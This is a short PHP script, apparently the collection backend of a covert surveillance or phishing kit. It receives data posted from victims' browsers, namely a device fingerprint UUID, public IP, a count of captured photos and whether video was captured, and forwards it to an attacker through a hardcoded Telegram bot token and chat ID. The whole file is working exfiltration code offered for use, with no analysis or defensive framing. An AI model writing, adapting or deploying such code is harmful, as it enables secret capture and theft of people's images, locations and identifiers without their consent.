<?php
// send_data.php - Reçoit les données et les transmet au bot
$botToken = '8507961561:AAFGiLtXzjIcR-j2IQuIDA55QZDQEYQFq_4';
$chatId = '6767182328';

$data = json_decode(file_get_contents('php://input'), true);

if ($data) {
    $message = "🎯 NOUVELLE DONNÉE COLLECTÉE\n";
    $message .= "🕒 " . ($data['timestamp'] ?? date('Y-m-d H:i:s')) . "\n";
    $message .= "🆔 UUID: " . ($data['fingerprint']['uuid'] ?? 'inconnu') . "\n";
    $message .= "🌍 IP: " . ($data['publicIP'] ?? 'inconnue') . "\n";
    $message .= "📸 Photos: " . ($data['photosCount'] ?? 0) . "\n";
    $message .= "🎥 Vidéo: " . ($data['videoCaptured'] ? 'oui' : 'non');
    
    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message));
}

echo json_encode(['status' => 'ok']);
?>
